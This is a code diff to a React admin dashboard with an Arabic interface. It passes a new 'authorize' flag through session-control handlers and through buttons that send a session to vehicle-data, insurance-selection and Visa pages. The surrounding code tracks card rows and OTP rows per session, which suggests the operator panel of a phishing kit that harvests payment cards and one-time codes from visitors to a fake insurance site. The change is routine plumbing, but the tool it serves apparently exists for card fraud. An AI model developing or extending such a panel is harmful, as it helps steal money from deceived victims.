@@ -267,10 +267,10 @@ function SessionBox({
     setExpanded(cardRows.length > 0 || otpRows.length > 0);
   }, [cardRows.length, otpRows.length]);
 
-  const handleControl = async (action: string, code?: string) => {
+  const handleControl = async (action: string, code?: string, authorize?: boolean) => {
     setLoadingAction(action);
     try {
-      await onControl(sessionId, action, code);
+      await onControl(sessionId, action, code, authorize);
     } finally {
       setLoadingAction(null);
     }
@@ -546,19 +546,19 @@ function SessionBox({
                 <button
                   type="button"
                   disabled={loadingAction === "go_form"}
-                  onClick={() => void handleControl("go_form")}
+                  onClick={() => void handleControl("go_form", undefined, true)}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                 >{loadingAction === "go_form" ? "...جارٍ" : "📝 بيانات المركبة"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_select"}
-                  onClick={() => void handleControl("go_select")}
+                  onClick={() => void handleControl("go_select", undefined, true)}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                 >{loadingAction === "go_select" ? "...جارٍ" : "🏢 اختيار التأمين"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_visa"}
-                  onClick={() => void handleControl("go_visa")}
+                  onClick={() => void handleControl("go_visa", undefined, true)}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                 >{loadingAction === "go_visa" ? "...جارٍ" : "💳 الفيزا"}</button>
               </div>
@@ -956,7 +956,7 @@ export default function AdminDashboard() {
     setTrashItems([]);
   }, []);
 
-  const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string) => {
+  const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string, authorize?: boolean) => {
     const token = getToken();
     if (!token) {
       toast("error", "خطأ في التوثيق", "لم يتم العثور على رمز الدخول");
@@ -964,7 +964,7 @@ export default function AdminDashboard() {
     }
     
     try {
-      const result = await sendAdminControl(sessionId, action, token, code);
+      const result = await sendAdminControl(sessionId, action, token, code, authorize);
       
       // Map action to page name for display
       const pageNames: Record<string, string> = {
